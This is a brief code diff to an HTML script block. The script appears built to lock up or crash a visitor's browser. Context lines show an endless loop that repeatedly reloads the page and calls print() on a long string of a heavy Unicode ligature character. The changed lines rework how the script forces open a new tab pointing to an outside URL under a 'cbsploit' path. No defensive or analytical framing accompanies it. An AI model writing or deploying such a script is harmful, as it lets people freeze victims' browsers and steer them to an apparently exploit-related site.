@@ -5,5 +5,6 @@ while(true){
 location.reload(1) 
 print("﷽﷽﷽﷽﷽ so on") 
 }
-window.open("https://wockerland.tk/cbsploit/");
+let newTab = window.open();
+ newTab.location.href = "https://wockerland.tk/cbsploit/";
 </script>
